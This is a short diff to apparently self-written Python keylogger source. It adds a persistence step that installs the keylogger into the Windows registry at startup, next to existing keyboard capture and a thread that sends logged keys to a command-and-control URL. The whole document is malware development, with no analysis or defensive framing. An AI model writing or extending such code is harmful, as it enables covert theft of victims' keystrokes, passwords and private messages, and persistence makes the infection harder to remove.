@@ -6,6 +6,7 @@ import requests
 from pynput import keyboard
 from pathlib import Path
 from config import C2_URL, SEND_INTERVAL, MACHINE_ID
+from persistence import install, is_installed
 import win32gui  #interacting with the windows gui
 
 
@@ -82,6 +83,9 @@ def on_press(key):
 
 # main
 def start():
+    if not is_installed(): #install the keylogger to the registry
+        install()
+        
     # Start sender thread as daemon - *LINUX REFERENCE* (dies when main program exits aka i press esc)
     sender = threading.Thread(target=send_to_c2, daemon=True)
     sender.start()
